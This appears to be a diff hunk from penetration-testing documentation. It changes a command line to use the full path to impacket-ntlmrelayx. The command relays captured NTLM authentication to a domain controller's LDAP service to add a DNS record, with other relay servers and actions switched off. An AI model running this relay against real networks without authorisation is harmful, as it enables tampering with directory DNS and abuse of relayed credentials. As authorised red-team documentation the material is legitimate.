@@ -5,7 +5,7 @@ Read the package's relay-stage reference first. This branch makes a specific dir
 For an authorized DNS-record addition, define `dc_host`, `listen_ip`, `record_name` and `record_ip`. With a current build exposing the shown listener controls:
 
 ~~~bash
-impacket-ntlmrelayx -t "ldap://$dc_host" -ip "$listen_ip" --http-port 8080 \
+/usr/bin/impacket-ntlmrelayx -t "ldap://$dc_host" -ip "$listen_ip" --http-port 8080 \
   --add-dns-record "$record_name" "$record_ip" --no-dump --no-da --no-acl --no-validate-privs \
   --no-smb-server --no-wcf-server --no-raw-server --no-rpc-server \
   --no-winrm-server --no-mssql-server --no-rdp-server
